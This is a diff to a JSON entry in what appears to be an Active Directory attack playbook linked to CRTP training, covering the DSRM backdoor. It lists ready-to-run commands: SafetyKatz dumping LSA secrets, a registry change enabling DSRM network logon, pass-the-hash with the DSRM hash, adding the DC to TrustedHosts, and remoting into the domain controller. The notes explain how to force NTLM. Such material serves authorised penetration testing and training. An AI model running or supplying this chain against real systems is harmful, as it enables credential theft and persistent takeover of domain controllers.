@@ -33,12 +33,20 @@
       "command": "SafetyKatz.exe \"lsadump::lsa /patch\" \"exit\""
     },
     {
-      "label": "Enable DSRM network logon (run on DC)",
+      "label": "Enable DSRM network logon (run on DC via winrs)",
       "command": "New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD"
     },
     {
-      "label": "PTH with DSRM hash to DC",
+      "label": "PTH with DSRM hash (spawns new process)",
       "command": "SafetyKatz.exe \"sekurlsa::pth /domain:<dc_host> /user:Administrator /ntlm:<nt_hash> /run:powershell.exe\" \"exit\""
+    },
+    {
+      "label": "Add DC IP to TrustedHosts (from new process)",
+      "command": "Set-Item WSMan:\\localhost\\Client\\TrustedHosts <dc_ip>"
+    },
+    {
+      "label": "Connect to DC using injected DSRM creds",
+      "command": "Enter-PSSession -ComputerName <dc_ip> -Authentication NegotiateWithImplicitCredential"
     }
   ],
   "examples": [
@@ -77,7 +85,7 @@
       "note": "Continue enumeration/technique in this area"
     }
   ],
-  "notes": "DSRM hash doesn't change with AD password resets. Registry value 2 persists across reboots. Detectable via registry monitoring at HKLM\\System\\...\\Lsa.",
+  "notes": "DSRM hash doesn't change with AD password resets. Registry value 2 persists across reboots. Must use DC IP (not hostname) to force NTLM auth — hostname goes through Kerberos which won't work for local accounts. Use -Authentication NegotiateWithImplicitCredential to use the injected DSRM creds from the PTH process. Detectable via registry monitoring at HKLM\\System\\...\\Lsa.",
   "references": [
     {
       "title": "CRTP - DSRM Backdoor",
